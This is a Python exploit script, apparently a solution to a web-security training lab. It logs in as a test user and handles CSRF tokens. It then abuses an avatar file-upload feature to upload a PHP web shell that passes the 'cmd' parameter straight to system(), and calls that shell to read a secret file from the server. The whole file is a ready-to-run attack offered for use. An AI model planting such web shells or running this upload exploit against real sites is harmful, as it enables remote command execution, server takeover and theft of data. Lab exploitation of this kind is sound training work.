import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import random, string
from requests_toolbelt import MultipartEncoder

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http":"http://127.0.0.1:8087", "https":"http://127.0.0.1:8087"}

def get_csrf_token(session, url):
    res = session.get(url, proxies=proxies, verify=False)
    soup = BeautifulSoup(res.text, 'html.parser')
    csrf_input = soup.find('input', {'name': 'csrf'})

    if csrf_input:
        csrf_token = csrf_input.get('value')
        return csrf_token
    else:
        print("CSRF token not found in the HTML.")
        return None


def file_upload_exploit(session, url) :
    login_url = url + '/login'
    csrf_token = get_csrf_token(session, login_url)
    data = {'csrf':csrf_token,'username':'wiener','password':'peter'}
    res = session.post(login_url, data=data, verify=False, proxies=proxies)

    if "Log out" in res.text :
        print("(+) The wiener user log in successfully!")

        avatar_url = url + '/my-account/avatar'
        csrf_url = url + '/my-account?id=wiener'
        csrf_token = get_csrf_token(session, csrf_url)

        data = {
            'avatar':('test.php', '<?php system($_GET["cmd"]); ?>', 'application/octet-stream'),
            'user':'wiener',
            'csrf':csrf_token    
        }

        boundary = '-----------------------------' + ''.join(random.choices(string.digits, k=30))

        m = MultipartEncoder(fields=data, boundary=boundary)

        headers = {'Content-Type':m.content_type}

        r = session.post(avatar_url, data=m, headers=headers, proxies=proxies, verify=False)

        if r.status_code == 200 :
            print("(+) Successfully update the avatar image.")
            print("(+) Retrieving the wanted data...")

            exploit_url = url + '/files/avatars/test.php?cmd=cat /home/carlos/secret'
            r = session.get(exploit_url, verify=False, proxies=proxies)

            if r.status_code == 200 :
                print("(+) Successfully get the wanted data.")
                print(r.text)
            else :
                print('Could not retrieve the wanted data.')
                sys.exit(-1)
        else :
            print("(+) Could not update the avatar image.")
            sys.exit(-1)

if __name__ == "__main__" :
    try :
        url = sys.argv[1]
    except IndexError :
        print("(+) Usage : %s <url>" % sys.argv[0])
        print("(+) Example : %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    session = requests.Session()
    file_upload_exploit(session, url)